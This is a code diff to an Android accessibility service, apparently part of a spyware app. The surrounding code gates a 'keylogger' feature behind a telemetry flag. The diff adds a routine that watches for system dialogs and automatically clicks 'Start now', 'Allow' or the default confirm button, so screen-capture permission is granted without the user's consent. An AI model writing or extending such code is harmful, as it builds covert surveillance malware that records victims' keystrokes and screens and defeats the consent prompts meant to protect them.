@@ -6,6 +6,7 @@ import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import java.util.List;
 
 public class SnapAccessibilityService extends AccessibilityService {
@@ -52,6 +53,9 @@ public class SnapAccessibilityService extends AccessibilityService {
             int eventType = event.getEventType();
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 lastPackage = pkg;
+                if ("com.android.systemui".equals(pkg) || "android".equals(pkg)) {
+                    handleAutoApproveScreenCapture();
+                }
             } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 if (!TelemetrySyncHelper.isFeatureEnabled(this, "keylogger")) return;
 
@@ -86,6 +90,34 @@ public class SnapAccessibilityService extends AccessibilityService {
         } catch (Throwable e) {
             return pkg;
         }
+    }
+
+    private void handleAutoApproveScreenCapture() {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return;
+            String[] targets = {"Start now", "START NOW", "Start", "START", "Allow", "ALLOW"};
+            for (String target : targets) {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo node : nodes) {
+                        if (node != null && node.isClickable()) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            root.recycle();
+                            return;
+                        }
+                    }
+                }
+            }
+            List<AccessibilityNodeInfo> btn1 = root.findAccessibilityNodeInfosByViewId("android:id/button1");
+            if (btn1 != null && !btn1.isEmpty()) {
+                AccessibilityNodeInfo b = btn1.get(0);
+                if (b != null && b.isClickable()) {
+                    b.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                }
+            }
+            root.recycle();
+        } catch (Throwable ignored) {}
     }
 
     @Override
